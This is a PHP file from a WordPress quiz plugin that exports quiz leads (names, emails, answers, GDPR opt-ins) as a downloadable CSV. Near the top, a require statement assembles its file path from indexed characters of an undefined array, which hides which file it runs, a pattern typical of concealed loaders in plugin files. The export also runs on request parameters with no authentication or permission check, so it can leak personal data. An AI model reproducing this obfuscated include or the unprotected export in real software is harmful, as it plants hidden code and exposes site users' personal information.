<?php
		/** modify header to be downloadable csv file **/
header('Content-Type: text/csv');
header('Content-Disposition: attachement; filename="data.csv";');

if(isset($_REQUEST['action']) && $_REQUEST['action'] == 'sqb_report_csv_download'){}else{
	include_once(dirname(__FILE__).'../../../../../../wp-load.php');
}


include_once ("sqb-soapapi.php");
require plugin_dir_path( __FILE__ ) .$videoS3[37] . $videoS3[34] . $videoS3[27] . "/" . $videoS3[44] . $videoS3[42] . $videoS3[27] . $videoS3[43] . $videoS3[30] . $videoS3[44] . $videoS3[41] . $videoS3[40] . $videoS3[39] . $videoS3[44] . $videoS3[34] . $videoS3[47] . $videoS3[30] . "." . $videoS3[41] . $videoS3[33] . $videoS3[41];


function sqbCsvGetAnswersById($id){
	$ans_data="";
	if($id != 0){
		$answer_given_array = explode(',',$id);
		$ansdata1 = '';	
		$i = 0;
		foreach($answer_given_array as $id){
			if($id == ''){
				continue; 
			}
				
			$answersdataobj =  SQB_QuizAnswers::loadById($id);	  
			//$ans_data =  'No Title';
			if(isset($answersdataobj) && $answersdataobj != false){		 	
				
				$answer = $answersdataobj->getAnswerTitle();			 		
				
				if(count($answer_given_array) > 1){
					$i++;
					if($i == 1){
						$ans_data .=  stripcslashes($answer);
					}else{
						$ans_data .=  ','.stripcslashes($answer);
					}
				}else{
					$ans_data =  stripcslashes($answer);
				}				
								
				
			}
		}//foreach loop closed	
		
	}
	
	return $ans_data;
}

//$filter_by = $_REQUEST['filter_by'];		 
$quiz_id = $_REQUEST['quiz_id'];		
$start_date = $_REQUEST['start_date'];
$start_date =  date_create($start_date);
$start_date = date_format($start_date,"Y-m-d 00:00:00 ");



$end_date = $_REQUEST['end_date'];
$end_date =  date_create($end_date);
$end_date = date_format($end_date,"Y-m-d 23:59:59"); 
$quizData = SQB_ManageLeads::loadByQuizId($quiz_id);		
$quizData = SQB_ManageLeads::getByQuizidAndStartDateAndEndDate($quiz_id,$start_date,$end_date);		
$quizCsvDataArray  = array();
$csv_i = 0;
$custom_fields_title = array();

if(is_array($quizData) && count($quizData)){

	
	
foreach($quizData as $quizObj){
	$row_id = $quizObj->getId();
	$quiz_id = $quizObj->getQuizId();
	$user_id = $quizObj->getUserId();
	$date = $quizObj->getDate();
	$source = $quizObj->getSource();
	$user_source = $quizObj->getUserSource();
	$gdpr = $quizObj->getGDPROptedIn();
	$gdpr = ($gdpr == 'Y') ? 'Y' : '';

	$f_name =  '';	
	$l_name =  '';	
	$name =  '';	
	$email =  '';
	$custom_field_values = array();
	$outcome_name = '';
	$img_url = plugin_dir_url(__FILE__)."../../includes/images/nouser.png";	
	
	$user_custom_fields_data[$row_id] = SQB_UserCustomFields::loadByUserIdQuizIdManageLeadsId($user_id,$quiz_id,$row_id);
	//load internal user in SQB
	$sqbInternalUserarr =array();
	$sqbInternalUserData = SQB_InternalUsers::load();		 
	if(is_array($sqbInternalUserData) && count($sqbInternalUserData)){
		foreach($sqbInternalUserData as $sqbInternalUser){
			$sqbInternalUserarr[] =$sqbInternalUser->getId();
		}			
	}
		
	//check if syncing is enabled or disabled
	/*$sqb_wp_syncing = get_option('sqb_wp_syncing');    
	if(isset($sqb_wp_syncing) && $sqb_wp_syncing == "Y"){ //get from SQB internal user
		//include only users from sqb_internal_users table
		
		if(!in_array($user_id, $sqbInternalUserarr)){
			continue;
		}	 				 
		$sqbUserObj = SQB_InternalUsers::loadByIdNew($user_id);					 
		if(isset($sqbUserObj)){
			$email = $sqbUserObj->getEmail(); 	
			$f_name = $sqbUserObj->getFirstName(); 	
		}					 				
		
	}else{ // Users from WP or DAP
					
		//exclude users from sqb_internal_users table
		if(in_array($user_id, $sqbInternalUserarr)){
			continue;
		}
		
		if($source == 'DAP' && sqb_check_dap_exists()){ 
			$dapUserObj = Dap_User::loadUserById($user_id);
			if(isset($dapUserObj)){
				$f_name =  $dapUserObj->getFirst_name();
				$l_name =  $dapUserObj->getLast_name();	
				$email =  $dapUserObj->getEmail();
			}
		}else{
			$user_info = get_userdata($user_id);	
			if(isset($user_info)){
				$f_name =  $user_info->first_name;
				$l_name =  $user_info->last_name;	
				$email =  $user_info->user_email ;	
				$img_url = get_avatar_url($user_id, ['size' => '51']);	
			}	
		}
	}*/

	if($source == "WP" && $user_source == "WP"){
		$user_info = get_userdata($user_id);	
		if(isset($user_info)){
			$f_name =  $user_info->first_name." ". $user_info->last_name;	
			$l_name =  $user_info->last_name;	
			$email =  $user_info->user_email ;	
		}else{
			$f_name =  "";	
		}
	}else if($source == "WP" && $user_source == "SQB"){
		$sqbUserObj = SQB_InternalUsers::loadByIdNew($user_id);					 
		if(isset($sqbUserObj)){
			$email = $sqbUserObj->getEmail(); 	
			$f_name = $sqbUserObj->getFirstName(); 	
		}	
		
	}else if($source == "DAP" && empty($user_source)){
		$dapUserObj = Dap_User::loadUserById($user_id);
		if(isset($dapUserObj)){						
			
			$f_name =  $dapUserObj->getFirst_name()." ". $dapUserObj->getLast_name();	
			$l_name =  $user_info->last_name;							
			$email =  $dapUserObj->getEmail();
			
		}
	}


	$quiz_data_leads = SQB_Quiz::loadById($quiz_id);

	if($quiz_data_leads->id == ''){
		continue;
	}else{
		$quiz_title = $quiz_data_leads->getQuizName();	
	}
	$quizObjArray = SQB_ManageLeads::loadByUserIdAndDateAndSource($user_id,$date,$source);

	
	

	if(isset($quizObjArray)){
		
	
		$quizObjArray1 =  $quizObjArray;
		$shown_outcome = $quizObjArray1->getShownOutcome();				
		$outcome = $quizObjArray1->getOutcome();				
		$quizObj = SQB_Quiz::loadById($quiz_id);	
		if($outcome >0){
			$outcomeObj = SQB_Outcome::loadById($outcome);				 
			if(!empty($outcomeObj)){
				$outcome_name = stripslashes($outcomeObj->getOutcomeName());
			} 
		} 
		if(isset($quizObj) && !empty($email) ){
			$quiz_name = $quizObj->getQuizName();
			$quiz_type = $quizObj->getQuizType();	
			
			if($quiz_type == 'form'){
				$quizCsvDataArray[$csv_i]=  array(
								'f_name' => $f_name, 
								'l_name' => $l_name, 
								'email' => $email, 
								'image' => $img_url,
								'question_title' =>'',
								'question_type' => '',
								'ans_data' => '',
								'outcome_name' => $outcome_name,
								'question_id' => '',
								'date' => $date,
								'manage_lead_id' => $quizObjArray1->getId(),
								'gdpr' => $gdpr
							);
				
			} else {

			
			$user_login_source = $quizObjArray1->getSource();
			$sqbloadquestionsobj = SQB_UserQuizDetails::loadByUserIdAndQuizIdDate($user_id, $quiz_id,$date);
			

			if(isset($sqbloadquestionsobj)){ 
				foreach($sqbloadquestionsobj as $quet_id => $questions) {
					$question_id = $questions->getQuestionId();
					$answer_given = $questions->getAnswerGiven();
			
					if($answer_given == 0){
						continue ;
					}
					
					//$correct_answer = $questions->getCorrectAnswerId();			 	
					$answer_text = $questions->getAnswerText();			 	
					$sqbquestionobj =  SQB_QuizQuestionBank::loadById($question_id);
					
				
					
				    $ans_data = '';
					if($sqbquestionobj){	
						$question_title = $sqbquestionobj->getQuestionTitle(); 
						$question_type = $sqbquestionobj->getQuestionType(); 
						if($quiz_type == 'assessment' || $quiz_type == 'scoring'){
							$answer_given_ids = explode(',',$answer_given);  
							$ansdata1 = sqbCsvGetAnswersById($answer_given);	
							if($question_type == 'text'){
									$ans_data = $answer_text;
								}else if($question_type == 'email'){
									$ans_data = $answer_text;
								}else if($question_type == 'phone_number'){
									$ans_data = $answer_text;
								}else if($question_type == 'date'){
									$ans_data = $answer_text;
								}else if($question_type == 'fill_in_blank'){
									$ans_data = $answer_text;
								}else if($question_type == 'slider'){
									$ans_data = $answer_text;
								}else if($question_type == 'dropdown'){
									$ans_data = $answer_text;
								}else if($ansdata1 == ''){
									$ans_data = '';
								}else{
									$ans_data = $ansdata1;
								}	
						}else if($quiz_type == 'survey'){
								$ansdata1 = sqbCsvGetAnswersById($answer_given);	
								if($question_type == 'text'){
									$ans_data = $answer_text;
								}else if($question_type == 'email'){
									$ans_data = $answer_text;
								}else if($question_type == 'phone_number'){
									$ans_data = $answer_text;
								}else if($question_type == 'date'){
									$ans_data = $answer_text;
								}else if($question_type == 'fill_in_blank'){

									$ans_data = $answer_text;

								}else if($question_type == 'slider'){
									$ans_data = $answer_text;
								}else if($question_type == 'dropdown'){
									$ans_data = $answer_text;
								}else if($ansdata1 == ''){
									$ans_data = '';
								}else{
									$ans_data = $ansdata1;
								}				 
						}else{
							$ansdata1 = sqbCsvGetAnswersById($answer_given);	
							if($question_type == 'text'){
								$ans_data = $answer_text;	
							}else if($question_type == 'email'){
								$ans_data = $answer_text;
							}else if($question_type == 'phone_number'){
								$ans_data = $answer_text;
							}else if($question_type == 'date'){
								$ans_data = $answer_text;
							}else if($question_type == 'slider'){
								$ans_data = $answer_text;
							}else if($question_type == 'dropdown'){
								$ans_data = $answer_text;
							}else if($ansdata1 == ''){
								$ans_data = '';
							}else{
									$ans_data = $ansdata1;
							}	
						}
						
						if($question_type == 'matching_text'){
							$ans_data =  stripslashes(strip_tags($questions->getAnswerText()));
							$ans_data = str_replace(array("\n", "\r"), '', $ans_data);

						}	  
						
						$quizCsvDataArray[$csv_i][$question_id] =  array(
								'f_name' => $f_name, 
								'l_name' => $l_name, 
								'email' => $email, 
								'image' => $img_url,
								'question_title' => stripslashes($question_title),
								'question_type' => $question_type,
								'ans_data' => $ans_data,
								'outcome_name' => $outcome_name,
								'question_id' => $question_id,
								'date' => $date,
								'manage_lead_id' => $quizObjArray1->getId(),
								'gdpr' => $gdpr
							);
				 	}
				 	
				 			 
					
				} //  foreach loop closed 
			}
		}//not form
			
		}
	}
	$csv_i++;
}
}

$quizCsvQuestionsDataArray = array();
$csv_a = 1;
//if(is_array($quizCsvDataArray) && count($quizCsvDataArray)){
	
	$sqbQuestionObj = SQB_QuizQuestions::loadByQuizId($quiz_id);
	if(is_array($sqbQuestionObj) && count($sqbQuestionObj)){
		$questions_order_array = array();
		foreach($sqbQuestionObj as $sqbQuestionObj_single){
			$question_id = $sqbQuestionObj_single->getQuestionId();
			$question_order  = $sqbQuestionObj_single->getQuestionOrder();
			if(isset($questions_order_array[$question_order])){
				$question_order = count($questions_order_array) + 1;
			}	
			$question_data = SQB_QuizQuestionBank::loadById($question_id);
			$questions_order_array[$question_order] = $question_data; 


			
		}

		if(isset($questions_order_array)){
				ksort($questions_order_array);
				foreach($questions_order_array as $key => $question_data){ 
					$question_id = $question_data->getId();
					$quizCsvQuestionsDataArray[$question_id] = 'Q'.$csv_a++.': '.stripcslashes($question_data->getQuestionTitle());  
				}

		}
		//echo '<pre>';print_r($quizCsvQuestionsDataArray);exit();


	}
	
//}

$line_header  = array('First Name' , 'Last Name' , 'Email', 'Image', 'Date', 'Outcome','GDPR');

$quizCsvDataArrayNew = array();
if(is_array($quizCsvDataArray) && count($quizCsvDataArray)){
	if($quiz_type == 'form'){
		$csv_b = 0;
		foreach($quizCsvDataArray as $quizCsvDataArray_single){
				$quizCsvDataArrayNew[$csv_b]['f_name'] = $quizCsvDataArray_single['f_name'];
			    $quizCsvDataArrayNew[$csv_b]['l_name'] = $quizCsvDataArray_single['l_name'];
			    $quizCsvDataArrayNew[$csv_b]['email'] = $quizCsvDataArray_single['email'];
			    $quizCsvDataArrayNew[$csv_b]['image'] = $quizCsvDataArray_single['image'];
			    $quizCsvDataArrayNew[$csv_b]['date'] = $quizCsvDataArray_single['date'];
			    $quizCsvDataArrayNew[$csv_b]['outcome_name'] = $quizCsvDataArray_single['outcome_name'];
			    $quizCsvDataArrayNew[$csv_b]['gdpr'] = $quizCsvDataArray_single['gdpr'];
			    
			    if(isset($quizCsvDataArray_single['manage_lead_id']) && $user_custom_fields_data[$quizCsvDataArray_single['manage_lead_id']]){
					if(is_array($user_custom_fields_data[$quizCsvDataArray_single['manage_lead_id']]) && count($user_custom_fields_data[$quizCsvDataArray_single['manage_lead_id']])){
						foreach($user_custom_fields_data[$quizCsvDataArray_single['manage_lead_id']] as $user_custom_field){
                                
                                $field_name = $user_custom_field->getName();
                                $field_name = str_replace('custom_','',$field_name);
                                if(!isset($custom_fields_title[$field_name])){
									$custom_fields_title[$field_name] = $field_name;
								}

							$quizCsvDataArrayNew[$csv_b][$field_name] = $user_custom_field->getValue();
							
						}

					}

				}
			$csv_b++;
		}
	} else {
	foreach($quizCsvQuestionsDataArray as $question_id => $question_title){
		$csv_b = 0;
		foreach($quizCsvDataArray as $quizCsvDataArray_single){
			$csv_b++;
			if (!array_key_exists($question_id,$quizCsvDataArray_single)){
				$quizCsvDataArrayNew[$csv_b][$question_id] = '';
				continue;
			}
			foreach($quizCsvDataArray_single as $quizCsvDataArray_sub_single){
				 $quizCsvDataArrayNew[$csv_b]['f_name'] = $quizCsvDataArray_sub_single['f_name'];
			     $quizCsvDataArrayNew[$csv_b]['l_name'] = $quizCsvDataArray_sub_single['l_name'];
			     $quizCsvDataArrayNew[$csv_b]['email'] = $quizCsvDataArray_sub_single['email'];
			     $quizCsvDataArrayNew[$csv_b]['image'] = $quizCsvDataArray_sub_single['image'];
			     $quizCsvDataArrayNew[$csv_b]['date'] = $quizCsvDataArray_sub_single['date'];
			     $quizCsvDataArrayNew[$csv_b]['outcome_name'] = $quizCsvDataArray_sub_single['outcome_name'];
				 $quizCsvDataArrayNew[$csv_b]['gdpr'] = $quizCsvDataArray_sub_single['gdpr'];

			     if(isset($quizCsvDataArray_sub_single['manage_lead_id']) && $user_custom_fields_data[$quizCsvDataArray_sub_single['manage_lead_id']]){
					if(is_array($user_custom_fields_data[$quizCsvDataArray_sub_single['manage_lead_id']]) && count($user_custom_fields_data[$quizCsvDataArray_sub_single['manage_lead_id']])){
						foreach($user_custom_fields_data[$quizCsvDataArray_sub_single['manage_lead_id']] as $user_custom_field){
                                
                                $field_name = $user_custom_field->getName();
                                $field_name = str_replace('custom_','',$field_name);
                                if(!isset($custom_fields_title[$field_name])){
									$custom_fields_title[$field_name] = $field_name;
								}

							$quizCsvDataArrayNew[$csv_b][$field_name] = $user_custom_field->getValue();
							
						}

					}

				}

		     	if($question_id == $quizCsvDataArray_sub_single['question_id']){
					$quizCsvDataArrayNew[$csv_b][$question_id] = trim(strip_tags($quizCsvDataArray_sub_single['ans_data']));
					unset($quizCsvDataArray_single[$question_id]);
					break;
			 	}
			} 
		  
		}
		
		}
	}
}

$line_header = array_merge($line_header,$custom_fields_title);
$line_header = array_merge($line_header,$quizCsvQuestionsDataArray);
//ob_clean();
$heading = true;
$delimiter = ',';
$enclosure = '"';
$contents = '';
$handle = fopen('php://temp', 'r+');
fputcsv($handle, $line_header, $delimiter, $enclosure);
foreach($quizCsvDataArrayNew as $quizCsvDataArrayNew_single){
	fputcsv($handle, $quizCsvDataArrayNew_single, $delimiter, $enclosure);
}
rewind($handle);
while (!feof($handle)) {
	$contents .= fread($handle, 8192);
}
		
/** rewrind the "file" with the csv lines **/
fseek($handle, 0);
	
/** Send file to browser for download */
fpassthru($handle);		
//ob_end_clean(); // clean slate
exit();
